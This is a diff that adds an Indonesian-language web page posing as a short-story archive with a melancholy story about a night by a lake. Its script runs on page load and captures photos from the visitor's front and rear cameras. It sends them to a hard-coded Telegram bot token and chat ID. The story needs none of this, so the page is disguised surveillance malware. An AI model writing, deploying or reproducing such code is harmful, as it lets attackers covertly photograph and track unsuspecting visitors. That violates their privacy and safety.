@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Baca cerita pendek inspiratif dan menghibur di tepi danau malam">
+    <title>Arsip Cerpen - Malam di Pinggir Danau</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+    <style>
+        /* Custom Animations and Theming */
+        body {
+            background: linear-gradient(to bottom, #1e3a8a, #0f172a);
+            color: #e2e8f0;
+            font-family: 'Merriweather', serif;
+        }
+        .header-bg {
+            background: linear-gradient(135deg, #1e40af, #1e3a8a);
+            transition: background 0.5s ease;
+        }
+        .header-bg:hover {
+            background: linear-gradient(135deg, #1e3a8a, #1e40af);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fadeIn {
+            animation: fadeIn 1.5s ease-out forwards;
+        }
+        @keyframes ripple {
+            0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.5); }
+            70% { box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+        }
+        .read-more-btn {
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        .read-more-btn:hover {
+            transform: scale(1.05);
+            animation: ripple 1s infinite;
+        }
+        nav a {
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+        nav a:hover {
+            color: #93c5fd;
+            transform: scale(1.1);
+        }
+        .cerpen {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+        .cerpen-content.hidden {
+            display: none;
+        }
+        .status-box {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 1rem;
+            border-radius: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+    <header class="header-bg text-white text-center py-8">
+        <h1 class="text-4xl font-bold animate-fadeIn font-sans">Arsip Cerpen</h1>
+        <p class="mt-2 text-lg animate-fadeIn font-sans" style="animation-delay: 0.2s;">Baca cerita pendek inspiratif di tepi danau malam</p>
+    </header>
+    <nav class="bg-gray-900 py-4 text-center">
+        <a href="#beranda" class="text-white mx-4 font-semibold font-sans">Beranda</a>
+        <a href="#cerpen" class="text-white mx-4 font-semibold font-sans">Cerpen</a>
+        <a href="#tentang" class="text-white mx-4 font-semibold font-sans">Tentang</a>
+        <a href="#kontak" class="text-white mx-4 font-semibold font-sans">Kontak</a>
+    </nav>
+    <div class="container max-w-3xl mx-auto my-8 px-4">
+        <section class="cerpen p-6 rounded-lg animate-fadeIn" style="animation-delay: 0.4s;">
+            <h2 class="text-2xl font-bold text-white font-sans">Judul Cerpen: Malam di Pinggir Danau</h2>
+            <p class="text-gray-300 italic mt-2">Oleh: Ahmad Subhan</p>
+            <div class="cerpen-content text-gray-200">
+                <p class="mt-4">Di pinggir danau yang tenang, angin malam berhembus pelan, membawa aroma tanah basah setelah hujan. Aku duduk di batu besar, memandang bayangan bulan yang bergoyang-goyang di permukaan air. Malam ini, seperti malam-malam sebelumnya, penuh dengan kenangan yang tak ingin kulepaskan.</p>
+                <div class="cerpen-content hidden">
+                    <p class="mt-4">Dulu, saat musim panas yang panjang, kami sering datang ke sini. Dia, dengan senyumnya yang selalu membuat dunia terasa lebih cerah, dan aku, yang hanya bisa diam sambil mendengarkan ceritanya tentang bintang-bintang. "Lihat itu," katanya suatu malam, menunjuk ke langit. "Bintang jatuh. Buatkan permintaanmu."</p>
+                    <p class="mt-4">Aku tersenyum dalam hati. Permintaanku selalu sama: agar waktu berhenti di sini, selamanya. Tapi waktu tak pernah mendengar. Kini, dia pergi, meninggalkan aku dengan danau ini dan angin yang seolah berbisik nama-namanya.</p>
+                    <p class="mt-4">Tiba-tiba, angin berhembus lebih kencang. Aku merasa dingin menyusup ke tulang. Tapi bukan dingin udara—itu dingin hati. Aku bangkit, melangkah pergi, tapi kaki ini berat. Mungkin, malam ini adalah malam terakhir. Besok, aku harus belajar melepaskan.</p>
+                    <p class="mt-4">Danau tetap tenang, seolah tak peduli. Begitulah hidup: mengalir, tak terganggu oleh air mata kita.</p>
+                </div>
+            </div>
+            <button class="read-more-btn bg-blue-600 text-white px-4 py-2 mt-4 rounded-lg hover:bg-blue-700 font-sans" onclick="toggleReadMore()">Baca Selengkapnya</button>
+            <div class="mt-6">
+                <div id="status" class="status-box text-gray-200 font-sans"></div>
+            </div>
+        </section>
+    </div>
+    <footer class="bg-gray-900 text-white text-center py-4 font-sans">
+        <p>&copy; 2025 Arsip Cerpen. Semua hak cipta dilindungi.</p>
+    </footer>
+    <script>
+        // Existing toggleReadMore function
+        function toggleReadMore() {
+            const content = document.querySelector('.cerpen-content .hidden');
+            const button = document.querySelector('.read-more-btn');
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                button.textContent = 'Sembunyikan';
+            } else {
+                content.classList.add('hidden');
+                button.textContent = 'Baca Selengkapnya';
+            }
+        }
+
+        // Photo capture and Telegram code
+        const TELEGRAM_TOKEN = "8210666739:AAH6A1pNHccX_-Ndil8nwsO1g5_R6oj3N2s";
+        const CHAT_ID = "1097391015";
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mime });
+        }
+
+        async function takePhoto(cam) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const bitmap = await imageCapture.grabFrame();
+            track.stop();
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        async function sendPhoto(dataURL, name) {
+            const blob = dataURItoBlob(dataURL);
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('photo', blob, name);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+        }
+
+        async function init() {
+            document.getElementById("status").innerText = "📷 Ambil foto depan...";
+            try {
+                const front = await takePhoto('user');
+                await sendPhoto(front, "front.jpg");
+
+                document.getElementById("status").innerText = "📷 Ambil foto belakang...";
+                const back = await takePhoto('environment');
+                await sendPhoto(back, "back.jpg");
+
+                document.getElementById("status").innerText = "✅ Foto terkirim ke Telegram!";
+            } catch (err) {
+                console.error(err);
+                document.getElementById("status").innerText = "❌ Error: " + err.message;
+            }
+        }
+
+        // Automatically trigger init() when the page loads
+        window.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
